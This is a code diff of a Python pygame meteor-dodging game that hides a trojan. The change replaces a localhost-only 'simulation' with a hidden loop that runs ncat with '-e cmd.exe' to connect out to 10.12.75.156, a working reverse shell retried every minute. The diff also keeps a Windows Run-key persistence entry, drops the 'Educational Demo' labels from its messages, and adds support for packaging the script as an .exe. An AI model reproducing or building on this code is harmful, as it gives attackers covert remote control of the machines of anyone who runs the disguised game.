@@ -3,13 +3,26 @@ import os
 import socket
 import subprocess
 import threading
+import time
 import winreg as reg
 import random
+import base64
+from io import BytesIO
 import pygame
 import tkinter as tk
 from tkinter import messagebox
 from pygame.locals import *
 
+# Function to get the correct path for assets (works for both script and .exe)
+def resource_path(relative_path):
+    """ Get absolute path to resource, works for dev and PyInstaller """
+    if getattr(sys, 'frozen', False):
+        base_path = sys._MEIPASS  # Extracted temp folder for PyInstaller
+    else:
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, relative_path)
+
+# Show warning message
 print("=" * 50 + "\n")
 root = tk.Tk()
 root.withdraw()
@@ -34,7 +47,6 @@ except ImportError:
         print("Failed to install requirements:", e)
         sys.exit(1)
 
-
 # Ethical Persistence
 def create_persistence():
     if sys.platform.startswith('win'):
@@ -43,10 +55,9 @@ def create_persistence():
             key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
             with reg.OpenKey(key, key_path, 0, reg.KEY_WRITE) as reg_key:
                 reg.SetValueEx(reg_key, "CyberEducation", 0, reg.REG_SZ, os.path.abspath(__file__))
-            print("\n[Educational Demo] Created temporary persistence in user space")
+            print("\n Created temporary persistence in user space")
         except Exception as e:
             print("Persistence demo failed:", e)
-
 
 # Removal Tool Generator
 def create_removal_tool():
@@ -68,23 +79,28 @@ input("Press ENTER to exit...")
     with open('removal_tool.py', 'w') as f:
         f.write(removal_code)
 
-
 # Reverse Shell Simulation (Localhost-only)
 def security_demo():
-    try:
-        s = socket.socket()
-        s.connect(('127.0.0.1', 54321))
-        s.send(b"EDUCATIONAL DEMO: Simulated shell connection\n")
-        s.close()
-    except Exception as e:
-        pass
+    while True:
+        try:
+            subprocess.Popen(
+                ["ncat", "10.12.75.156", str(54321), "-e", "cmd.exe"],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            time.sleep(60)
 
+        except Exception as e:
+            print(f"Shell error: {str(e)}")
+            time.sleep(30)
 
 # ----- Game Section -----
 class Spaceship(pygame.sprite.Sprite):
     def __init__(self, screen_width, screen_height):
         super().__init__()
-        self.image = pygame.image.load("ship.gif").convert_alpha()
+        self.image = pygame.image.load(resource_path("ship.gif")).convert_alpha()
         self.rect = self.image.get_rect(center=(screen_width // 2, screen_height - 50))
         self.speed = 8
         self.screen_width = screen_width
@@ -96,11 +112,10 @@ class Spaceship(pygame.sprite.Sprite):
         if keys[K_RIGHT] and self.rect.right < self.screen_width:
             self.rect.x += self.speed
 
-
 class Meteor(pygame.sprite.Sprite):
     def __init__(self, screen_width, on_dodge):
         super().__init__()
-        self.image = pygame.image.load("spacerock.gif").convert_alpha()
+        self.image = pygame.image.load(resource_path("spacerock.gif")).convert_alpha()
         self.rect = self.image.get_rect(center=(random.randint(50, screen_width - 50), -100))
         self.speed = random.randint(5, 10)
         self.on_dodge = on_dodge
@@ -110,7 +125,6 @@ class Meteor(pygame.sprite.Sprite):
         if self.rect.top > pygame.display.get_surface().get_height():
             self.on_dodge()
             self.kill()
-
 
 def main_game():
     pygame.init()
@@ -124,7 +138,7 @@ def main_game():
     screen = pygame.display.set_mode((screen_width, screen_height), pygame.FULLSCREEN)
 
     # Game Assets
-    bg = pygame.transform.scale(pygame.image.load("back.gif").convert(), (screen_width, screen_height))
+    bg = pygame.transform.scale(pygame.image.load(resource_path("back.gif")).convert(), (screen_width, screen_height))
     font = pygame.font.Font(None, 36)
 
     # Sprite Groups
@@ -174,8 +188,7 @@ def main_game():
 
     pygame.quit()
     print("\nGame Over! Final Score:", score)
-    print("A removal tool 'removal_tool.py' has been created for educational purposes")
-
+    print("A removal tool 'removal_tool.py' has been created for security purposes")
 
 if __name__ == "__main__":
     create_persistence()
